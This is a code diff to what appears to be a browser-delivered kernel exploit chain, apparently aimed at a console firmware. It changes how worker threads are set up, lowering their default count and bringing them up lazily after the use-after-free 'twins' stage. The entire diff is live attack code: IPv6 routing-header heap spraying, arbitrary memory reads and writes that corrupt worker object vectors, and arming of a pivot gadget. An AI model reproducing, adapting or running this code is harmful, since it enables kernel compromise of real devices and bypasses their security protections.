@@ -135,8 +135,8 @@ const F_SETFL = 4, O_NONBLOCK = 4;
 const IP6_RTHDR0_SIZE = 8, IN6_ADDR_SIZE = 0x10;
 const NUM_MSG_IOV = 0x17, IOVEC_SIZE = 0x10, MSGHDR_SIZE = 0x30;
 const NUM_IPV6_SOCK_DEFAULT = 0x80;
-const NUM_IOV_WORKER_DEFAULT = 2;
-const NUM_UIO_WORKER_DEFAULT = 2;
+const NUM_IOV_WORKER_DEFAULT = 1;
+const NUM_UIO_WORKER_DEFAULT = 1;
 
 const RTHDR_TAG = 0x13370000;
 const MAX_ROUNDS_TWIN = 10, MAX_ROUNDS_TRIPLET = 500, FIND_TRIPLET_FAST = 5000;
@@ -159,7 +159,7 @@ let savedMask = null, savedPrio = null, restoreCtx = null, attrsRestored = false
 
 let allDone = false;
 
-const CHAIN_BUILD = "plop-13.52-2026-03-26-park4wk";
+const CHAIN_BUILD = "plop-13.52-2026-03-26-lazy-workers";
 
 (async function () {
     let p = null;
@@ -193,7 +193,7 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26-park4wk";
             + " ipv6=" + IPV6_PLAN + " attempts=" + NUM_ATTEMPT
             + " spray=" + NUM_IOV_SPRAY
             + " mode=" + (STOP_BEFORE_DOUBLE ? "stop-before-double" : "armed")
-            + " (full Poops: ?iov=4&uio=4&ipv6=256)");
+            + " (full: ?iov=4&uio=4&ipv6=256&slots=10000000)");
 
         let kpatch = null, payload = null;
         let kernelBlobsLoaded = false;
@@ -856,10 +856,10 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26-park4wk";
                 + " affinity=" + a + " rtprio=" + r);
         }
         dropGroomFootprint();
-        state("ipv6 park (main-only)...", "warn");
-        await openIpv6FdBatch("park-open");
-        closeIpv6FdBatch("park-before-workers");
-        for (let y = 0; y < 6; ++y) sc(SYS.sched_yield);
+        state("opening reclaim sockets...", "warn");
+        await openIpv6ReclaimSockets();
+        logQuiet = false;
+        paintLog();
 
         async function pinWorkerRealtime(w) {
             sc(SYS.sched_yield);
@@ -869,68 +869,68 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26-park4wk";
             await fireW(w, SYS.rtprio_thread, [RTP_SET, 0, prioAddr]);
         }
 
-        state("bringing up " + TOTAL_WORKERS + " workers...", "warn");
-        dropGroomFootprint();
-        lines.length = 0;
-        for (let i = 0; i < TOTAL_WORKERS; ++i) {
-            if (i > 0) {
+        let iovWorkers = [];
+        let uioWorkers = [];
+        let workersReady = false;
+
+        async function ensureWorkerPool() {
+            if (workersReady && workers.length === TOTAL_WORKERS) return;
+            if (ipv6.length > 0) closeIpv6FdBatch("pre-worker-spawn");
+            dropGroomFootprint();
+            lines.length = 0;
+            state("bringing up " + TOTAL_WORKERS + " workers...", "warn");
+            for (let i = workers.length; i < TOTAL_WORKERS; ++i) {
+                post("WORKER-BRINGUP", (i + 1) + "/" + TOTAL_WORKERS);
+                const name = (i < NUM_IOV_WORKER ? "iov" : "uio")
+                    + (i < NUM_IOV_WORKER ? i : i - NUM_IOV_WORKER);
+                const w = { name: name, armed: false, wired: false };
+                workers.push(w);
+                w.worker = new Worker("rpc_worker.js?v=3");
+                w.rpc = makeRpc(w.worker, name);
+                if ((await w.rpc("ping", 15000)) !== "pong")
+                    throw new Error(name + " did not answer ping");
+                const sLo = (0x10100000 | i) >>> 0, sHi = (0xc0de0000 | i) >>> 0;
+                const arr = await w.rpc("init", 15000, sLo, sHi);
+                const D = bufAddr(arr.buffer);
+                if ((p.read4(D) >>> 0) !== sLo)
+                    throw new Error(name + ": transfer did not preserve the store");
+                const storage = p.read8(D.add32(0x10));
+                const mc = ptrish(storage) ? p.read8(storage.add32(8)) : null;
+                if (!mc || !ptrish(mc)) throw new Error(name + ": walk failed");
+                const bf = p.read8(mc.add32(8));
+                let wm = null, wv = null, wl = null;
+                for (let k = 1; k <= 8; ++k) {
+                    const val = p.read8(bf.sub32(8 * k));
+                    if (!ptrish(val)) continue;
+                    const inl = p.read8(val.add32(0x10));
+                    const len = p.read4(val.add32(0x18)) >>> 0;
+                    if (inl.hi === 0 && inl.low === 2) { if (!wl) wl = val; }
+                    else if (inl.hi > 0 && len === 6) { if (!wm) wm = val; }
+                    else if (inl.hi > 0 && len === 0x30) { if (!wv) wv = val; }
+                }
+                if (!(wm && wv && wl)) throw new Error(name + ": shapes not found");
+                w.master = wm; w.origVector = p.read8(wm.add32(0x10));
+                p.write8(wm.add32(0x10), wv); w.wired = true;
+                await w.rpc("setup", 15000, wl.low, wl.hi);
+                await w.rpc("armPivot", 15000, G.G0.low, G.G0.hi);
+                w.armed = true;
+                await pinWorkerRealtime(w);
                 dropGroomFootprint();
                 sc(SYS.sched_yield);
-                sc(SYS.sched_yield);
             }
-            post("WORKER-BRINGUP", (i + 1) + "/" + TOTAL_WORKERS);
-            const name = (i < NUM_IOV_WORKER ? "iov" : "uio")
-                + (i < NUM_IOV_WORKER ? i : i - NUM_IOV_WORKER);
-            const w = { name: name, armed: false, wired: false };
-            workers.push(w);
-            w.worker = new Worker("rpc_worker.js?v=2");
-            w.rpc = makeRpc(w.worker, name);
-            if ((await w.rpc("ping", 15000)) !== "pong")
-                throw new Error(name + " did not answer ping");
-            const sLo = (0x10100000 | i) >>> 0, sHi = (0xc0de0000 | i) >>> 0;
-            const arr = await w.rpc("init", 15000, sLo, sHi);
-            w.markerArr = arr;
-            const D = bufAddr(arr.buffer);
-            if ((p.read4(D) >>> 0) !== sLo)
-                throw new Error(name + ": transfer did not preserve the store");
-            const storage = p.read8(D.add32(0x10));
-            const mc = ptrish(storage) ? p.read8(storage.add32(8)) : null;
-            if (!mc || !ptrish(mc)) throw new Error(name + ": walk failed");
-            const bf = p.read8(mc.add32(8));
-            let wm = null, wv = null, wl = null;
-            for (let k = 1; k <= 8; ++k) {
-                const val = p.read8(bf.sub32(8 * k));
-                if (!ptrish(val)) continue;
-                const inl = p.read8(val.add32(0x10));
-                const len = p.read4(val.add32(0x18)) >>> 0;
-                if (inl.hi === 0 && inl.low === 2) { if (!wl) wl = val; }
-                else if (inl.hi > 0 && len === 6) { if (!wm) wm = val; }
-                else if (inl.hi > 0 && len === 0x30) { if (!wv) wv = val; }
+            check("worker-came-arw",
+                workers.length === TOTAL_WORKERS,
+                workers.length + "/" + TOTAL_WORKERS);
+            iovWorkers = workers.slice(0, NUM_IOV_WORKER);
+            uioWorkers = workers.slice(NUM_IOV_WORKER);
+            mark("WORKERS-LAZY", "iov=" + iovWorkers.length + " uio=" + uioWorkers.length
+                + " core=" + MAIN_CORE + " rtp=" + RTP);
+            if (ipv6.length !== NUM_IPV6_SOCK) {
+                state("reopening reclaim sockets...", "warn");
+                await openIpv6ReclaimSockets();
             }
-            if (!(wm && wv && wl)) throw new Error(name + ": shapes not found");
-            w.master = wm; w.origVector = p.read8(wm.add32(0x10));
-            p.write8(wm.add32(0x10), wv); w.wired = true;
-            await w.rpc("setup", 15000, wl.low, wl.hi);
-            await w.rpc("armPivot", 15000, G.G0.low, G.G0.hi);
-            w.armed = true;
-            w.markerArr = null;
-            await pinWorkerRealtime(w);
-            dropGroomFootprint();
-            sc(SYS.sched_yield);
+            workersReady = true;
         }
-        check("worker-came-arw",
-            workers.length === TOTAL_WORKERS,
-            workers.length + "/" + TOTAL_WORKERS);
-        const iovWorkers = workers.slice(0, NUM_IOV_WORKER);
-        const uioWorkers = workers.slice(NUM_IOV_WORKER);
-        post("WORKER-POOLS", "iov=" + iovWorkers.length
-            + " uio=" + uioWorkers.length);
-        mark("WORKERS-PINNED", "n=" + workers.length + " core=" + MAIN_CORE
-            + " rtp=" + RTP);
-        state("opening reclaim sockets...", "warn");
-        await openIpv6ReclaimSockets();
-        logQuiet = false;
-        paintLog();
 
         function tagFor(i) { return (RTHDR_TAG | (i & 0xffff)) >>> 0; }
         function readTag() {
@@ -1147,6 +1147,7 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26-park4wk";
             mark("TWINS", "a=" + twins.a + " b=" + twins.b
                 + " round=" + twins.round);
 
+            await ensureWorkerPool();
             freeRthdr(twins.b);
             let reclaimed = false, rounds = 0;
 
